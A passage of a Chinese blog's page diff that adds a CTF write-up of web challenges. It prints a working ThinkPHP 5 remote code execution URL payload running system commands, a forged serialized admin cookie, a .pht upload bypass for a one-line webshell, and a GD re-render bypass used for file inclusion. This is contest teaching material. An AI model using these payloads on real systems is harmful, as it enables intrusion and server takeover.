+<h3 id="tp5"><a href="#tp5" class="headerlink" title="tp5"></a>tp5</h3><p>这个题目就是最近几天刚爆出来的tp5远程getshell的漏洞，直接上网搜payload，参考了这篇文章:<a href="https://mp.weixin.qq.com/s/NQAZPz8uT8eNFyeMT4l8Ig" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/NQAZPz8uT8eNFyeMT4l8Ig</a></p>
+<p>我用的是下面的payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://219.219.61.234:10005/public/index.php?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami</span><br></pre></td></tr></table></figure>
+<p>最后获取flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://219.219.61.234:10005/public/index.php?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cat%20/flag</span><br></pre></td></tr></table></figure>
+<p><a href="https://imgchr.com/i/FaBebt" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/12/15/FaBebt.png" alt="FaBebt.png"></a></p>
+<h3 id="secret-system"><a href="#secret-system" class="headerlink" title="secret-system"></a>secret-system</h3><p>一进去之后会发现login功能没反应，而upload页面也需要管理员权限，肯定是要伪造自己是管理员的身份然后去挖掘文件上传的漏洞，查看源代码无果后顺手看看<code>robots.txt</code>,发现里面有登录的地址</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: index.php?r=site/loginuser_1</span><br></pre></td></tr></table></figure>
+<p>然后就可以进去登陆的页面，再次查看源代码发现作者的信息</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">*** author: cib_zhinianyuxin.com</span><br><span class="line">*** code: github.com</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure>
+<p>顺手去查一下,发现可以用<code>test/cib_sec</code>登录但不是<code>admin</code>，而且泄露的代码里面说明了可以伪造cookie，cookie名称是Cib_security，是一段经过序列化的东西，到时候就可以伪造了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">##README.md</span><br><span class="line"></span><br><span class="line">    *** author: cib_zhinianyuxin.com</span><br><span class="line"></span><br><span class="line">It&apos;s just a system which is not completed , there are some tips:</span><br><span class="line"></span><br><span class="line">    you can use test/cib_sec to login ,but you are not admin!</span><br><span class="line">    only admin can upload file ,but whichone can not bypass my rules.</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line">$sign = array(</span><br><span class="line">                    &apos;id&apos;=&gt;$model-&gt;id,</span><br><span class="line">                    &apos;name&apos;=&gt;$model-&gt;username,</span><br><span class="line">                    &apos;sign&apos;=&gt;md5($model-&gt;id.$model-&gt;username),</span><br><span class="line">                );</span><br><span class="line">$_COOKIE[&apos;Cib_security&apos;] = serialize($sign);</span><br><span class="line">**/</span><br></pre></td></tr></table></figure>
+<p>以test身份登录后把cookie拿出来然后解码</p>
+<p><a href="https://imgchr.com/i/FadGK1" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/12/15/FadGK1.md.png" alt="FadGK1.md.png"></a></p>
+<p>然后把里面的MD5解一下发现是<code>2test</code>,那我们就构造一个<code>1admin</code>，构造如下的序列</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:3&#123;s:2:&quot;id&quot;;i:1;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:4:&quot;sign&quot;;s:32:&quot;6c5de1b510e8bdd0bc40eff99dcd03f8&quot;;&#125;</span><br></pre></td></tr></table></figure>
+<p>再次经过URL编码然后保存一下cookie就可以以admin身份登录，接上来就是文件上传的部分了，这里的文件上传就是个很简单的后缀名绕过，我试了贼久，这个后缀名有点偏，用的<code>pht</code>,然后发包上传一句话木马，菜刀链接，成功获取flag</p>
+<p><a href="https://imgchr.com/i/FawmQA" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/12/15/FawmQA.png" alt="FawmQA.png"></a></p>
+<h3 id="shell"><a href="#shell" class="headerlink" title="shell?"></a>shell?</h3><p>这个题目确实拓宽了新思路，做了好久才做出来，这个题目上来注册进去发现只有一个上传的功能，尝试了一下发现不是普通的上传绕过的问题，猜测可能还有别的地方遗漏了，于是扫了一下目录，发现还有个admin目录</p>
+<p><a href="https://imgchr.com/i/Fd2lLD" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/12/16/Fd2lLD.md.png" alt="Fd2lLD.md.png"></a></p>
+<p>进去之后发现是个弱口令，用户名跟密码分别是<code>admin</code>和<code>qwe123</code>，进去之后发现url有明显的文件包含的痕迹，但是不允许出现php的字样，这就很难受，各种伪协议就用不上，但是不包含php的话还是可以读的。</p>
+<p><a href="https://imgchr.com/i/Fd2aSP" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/12/16/Fd2aSP.md.png" alt="Fd2aSP.md.png"></a></p>
+<p>这样可以利用刚刚普通用户上传的东西，然后去文件包含执行，于是就尝试了图片马，结果PHP的代码会被解析掉。。。。。</p>
+<p><a href="https://imgchr.com/i/FdRPfI" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/12/16/FdRPfI.png" alt="FdRPfI.png"></a></p>
+<p>猜测应该是这几种情况</p>
+<p><a href="https://imgchr.com/i/FdRe0g" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/12/16/FdRe0g.md.png" alt="FdRe0g.md.png"></a></p>
+<p>试了半天图片注释区注入各种代码还是被解析。。。快崩溃了，这时候就剩下一种情况了，用了php 的gd 库，上传后图片被二次渲染过新的JPG 图片内容里含有这个 <code>CREATOR: gd-jpeg v1.0</code>也证明了这点， 这时候就想<code>渲染过后-&gt;PHP代码</code>这样的流程行不行？发现还是不行。。。难道是个PWN？心想绝逼不可能。。。。于是发现了这篇文章: <a href="https://www.freebuf.com/articles/web/54086.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/54086.html</a></p>
+<p>顿时给了我思路，只要改变里面进的渲染后没改变的那一部分不就行了么。。结果发现，各种图片文件有固有的格式是不能改变的，不然不能上传，过分了。。。但是留出来的不变的内容空间极小，根本写不进一句执行命令的代码。。</p>
+<p><img src="https://s1.ax1x.com/2018/12/16/FdWnKK.png" alt="FdWnKK.png"></p>
+<p>结果思路只能回到文件本身的结构上。。。搜到了这篇文章:<a href="https://rdot.org/forum/showthread.php?t=2780，大概意思就是强行构造一个数据块，里面包含了PHP的代码，里面有payload可以直接构造一下,我上传的图片是这样的" target="_blank" rel="noopener">https://rdot.org/forum/showthread.php?t=2780，大概意思就是强行构造一个数据块，里面包含了PHP的代码，里面有payload可以直接构造一下,我上传的图片是这样的</a></p>
+<p><a href="https://imgchr.com/i/FdWfZF" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/12/16/FdWfZF.md.png" alt="FdWfZF.md.png"></a></p>
+<p>上传过以后文件包含执行文件即可</p>
+<p><img src="https://s1.ax1x.com/2018/12/16/FdfaS1.png" alt="FdfaS1.png"></p>
+<p>再成功读取flag即可</p>
+<p><img src="https://s1.ax1x.com/2018/12/16/FdhFpR.png" alt="FdhFpR.png"></p>
+<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>这一次把web给ak了，真是舒服呐23333，截个图留念一下</p>
+<p><img src="https://s1.ax1x.com/2018/12/16/Fd5Lpd.png" alt="Fd5Lpd.png"></p>
 
       
     </div>
@@ -413,13 +442,13 @@
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2018/07/20/comp-net-1/">计网实验笔记(一)</a></p>
+        <p><span>本文标题:</span><a href="/2018/12/16/CUMT-month-race/">CUMT双月赛Web题解</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">0verWatch</a></p>
-        <p><span>发布时间:</span>2018-07-20, 14:05:22</p>
-        <p><span>最后更新:</span>2018-07-20, 14:18:51</p>
+        <p><span>发布时间:</span>2018-12-16, 20:05:32</p>
+        <p><span>最后更新:</span>2018-12-16, 20:06:24</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2018/07/20/comp-net-1/" title="计网实验笔记(一)">0verwatch.top/2018/07/20/comp-net-1/</a>
-            <span class="copy-path" data-clipboard-text="原文: 0verwatch.top/2018/07/20/comp-net-1/　　作者: 0verWatch" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2018/12/16/CUMT-month-race/" title="CUMT双月赛Web题解">0verwatch.top/2018/12/16/CUMT-month-race/</a>
+            <span class="copy-path" data-clipboard-text="原文: 0verwatch.top/2018/12/16/CUMT-month-race/　　作者: 0verWatch" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
         <p>
@@ -431,16 +460,10 @@
 
     <nav id="article-nav">
         
-            <div id="article-nav-newer" class="article-nav-title">
-                <a href="/2018/07/20/comp-net-2/">
-                    计网实验笔记(二)
-                </a>
-            </div>
-        
         
             <div id="article-nav-older" class="article-nav-title">
-                <a href="/2018/07/08/weiji-exam/">
-                    微机实验考试
+                <a href="/2018/11/30/anheng-11month/">
+                    安恒11月赛Web题目复现
                 </a>
             </div>
         
@@ -482,7 +505,7 @@
     <div id="toc" class="toc-article">
         <strong class="toc-title">文章目录</strong>
         
-            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#正文"><span class="toc-number">2.</span> <span class="toc-text">正文</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#实验内容第一点"><span class="toc-number">2.1.</span> <span class="toc-text">实验内容第一点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#实验内容第二点"><span class="toc-number">2.2.</span> <span class="toc-text">实验内容第二点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#实验内容第三点"><span class="toc-number">2.3.</span> <span class="toc-text">实验内容第三点</span></a></li></ol></li></ol>
+            <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#ez-upload"><span class="toc-number">1.</span> <span class="toc-text">ez-upload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Cve"><span class="toc-number">2.</span> <span class="toc-text">Cve</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#shop"><span class="toc-number">3.</span> <span class="toc-text">shop</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#tp5"><span class="toc-number">4.</span> <span class="toc-text">tp5</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#secret-system"><span class="toc-number">5.</span> <span class="toc-text">secret-system</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#shell"><span class="toc-number">6.</span> <span class="toc-text">shell?</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#小结"><span class="toc-number"></span> <span class="toc-text">小结</span></a>
         
     </div>
     <style>
@@ -544,15 +567,13 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2018/07/20/comp-net-2/" title="上一篇: 计网实验笔记(二)">
-                <i class="fa fa-angle-left"></i>
-            </a>
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
         
 
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
 
         
-            <a href="/2018/07/08/weiji-exam/" title="下一篇: 微机实验考试">
+            <a href="/2018/11/30/anheng-11month/" title="下一篇: 安恒11月赛Web题目复现">
                 <i class="fa fa-angle-right"></i>
             </a>
         
